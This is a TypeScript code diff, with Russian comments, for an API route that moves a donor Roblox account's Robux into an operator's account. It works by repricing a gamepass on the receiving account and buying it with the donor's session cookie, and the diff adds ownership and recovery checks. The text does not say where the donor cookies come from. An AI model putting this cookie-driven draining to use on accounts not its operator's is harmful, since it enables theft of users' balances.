@@ -1,6 +1,7 @@
 import { NextRequest, NextResponse } from "next/server";
 import { extractTwaUser } from "@/lib/twa-auth";
 import { prisma } from "@/lib/prisma";
+import { needsOwnershipCheck } from "@/lib/roblox-buyout";
 
 /**
  * "Слив" — drain a donor account's leftover balance into the operator's own
@@ -66,6 +67,19 @@ async function userGamepasses(userId: number, cookie: string): Promise<any[]> {
     const d = await r.json().catch(() => null);
     return Array.isArray(d?.gamePasses) ? d.gamePasses : [];
   } catch { return []; }
+}
+
+/** Владеет ли юзер геймпассом (зеркало bots/shared/drain.ts ownsGamepass).
+ *  null = проверка не удалась — трактовать консервативно. */
+async function ownsGamepass(userId: number, gpId: string): Promise<boolean | null> {
+  try {
+    const r = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/GamePass/${gpId}`, {
+      headers: ROBLOX_UA, signal: AbortSignal.timeout(8_000),
+    });
+    if (!r.ok) return null;
+    const d: any = await r.json().catch(() => null);
+    return Array.isArray(d?.data) ? d.data.length > 0 : null;
+  } catch { return null; }
 }
 
 async function getCsrf(cookie: string): Promise<string | null> {
@@ -283,6 +297,16 @@ export async function POST(req: NextRequest) {
     const sellerId = info.Creator?.Id ?? info.Creator?.CreatorTargetId ?? 0;
     if (!sellerId) return NextResponse.json({ error: "Не удалось определить продавца геймпасса" }, { status: 502 });
 
+    // 2.5 (Ф1) Донор уже владеет пассом → Roblox не даст купить повторно
+    // («один пасс = один слив на донора»). Раньше это выяснялось только после
+    // смены цены; заодно фиксируем донора для post-fail проверки владения.
+    const donorUser = await authed(donorCookie);
+    if (donorUser?.id) {
+      const preOwned = await ownsGamepass(donorUser.id, gpId);
+      if (preOwned === true)
+        return NextResponse.json({ ok: true, success: false, msg: "Донор уже владеет этим геймпассом (прошлый слив) — выбери другой пасс приёмника" });
+    }
+
     // 3. Change the price on the drain account to `target`
     const drainCsrf = await getCsrf(drainCookie);
     if (!drainCsrf) return NextResponse.json({ error: "CSRF приёмника не получен — cookie протух?" }, { status: 502 });
@@ -328,15 +352,37 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ ok: true, success: false, msg: "Cookie донора истёк — обнови" });
 
     const pData: any = await purchaseRes?.json().catch(() => null);
-    const [donorAfter, drainAfter] = await Promise.all([currency(donorCookie), currency(drainCookie)]);
+    let [donorAfter, drainAfter] = await Promise.all([currency(donorCookie), currency(drainCookie)]);
 
-    if (pData?.purchased) {
+    // Ф1: провал/таймаут не значит «не куплено» — Roblox мог провести покупку.
+    // Пре-чек 2.5 гарантирует, что владение появилось именно этой попыткой.
+    let recovered = false;
+    let recoveredMsg = "";
+    if (!pData?.purchased && donorUser?.id) {
+      const reason: string | null = pData ? (pData.reason ?? pData.errorMsg ?? "Неизвестная ошибка") : null;
+      if (!(reason && /already.?own/i.test(reason)) && needsOwnershipCheck(reason)) {
+        await new Promise(r => setTimeout(r, 2_500));
+        let owned = await ownsGamepass(donorUser.id, gpId);
+        if (owned !== true && (owned === null || reason === null)) {
+          await new Promise(r => setTimeout(r, 5_000));
+          owned = await ownsGamepass(donorUser.id, gpId);
+        }
+        if (owned === true) {
+          recovered = true;
+          recoveredMsg = ` (владение подтверждено проверкой после ошибки: ${reason ?? "нет ответа"})`;
+          console.warn(`[twa/drain] recovered: пасс ${gpId} — владение донором подтверждено после ошибки «${reason ?? "нет ответа"}»`);
+          [donorAfter, drainAfter] = await Promise.all([currency(donorCookie), currency(drainCookie)]);
+        }
+      }
+    }
+
+    if (pData?.purchased || recovered) {
       // Учёт в истории (PLAN +5.G.2): раньше успешный слив нигде не записывался.
       await (prisma as any).drainEvent.create({
         data: {
           donorName: s?.robloxAccountName ?? null,
           drainName: s?.drainAccountName ?? null,
-          amount: pData.price ?? target,
+          amount: pData?.price ?? target,
           gamepassId: gpId,
           source: "manual",
         },
@@ -348,15 +394,15 @@ export async function POST(req: NextRequest) {
       }).catch((e: any) => console.warn("[drain] belowSince reset failed:", e?.message ?? e));
       return NextResponse.json({
         ok: true, success: true,
-        drained: pData.price ?? target,
+        drained: pData?.price ?? target,
         via: priceRes.via,
         donorBalanceAfter: donorAfter,
         drainBalanceAfter: drainAfter,
-        msg: `Слито ${pData.price ?? target} R$ → ${s?.drainAccountName ?? "приёмник"}`,
+        msg: `Слито ${pData?.price ?? target} R$ → ${s?.drainAccountName ?? "приёмник"}${recoveredMsg}`,
       });
     }
 
-    const reason = pData?.reason ?? pData?.errorMsg ?? "Неизвестная ошибка";
+    const reason = pData ? (pData.reason ?? pData.errorMsg ?? "Неизвестная ошибка") : "Нет ответа от Roblox";
     return NextResponse.json({ ok: true, success: false, msg: `Покупка не прошла: ${reason}`, donorBalanceAfter: donorAfter, drainBalanceAfter: drainAfter });
   }
 
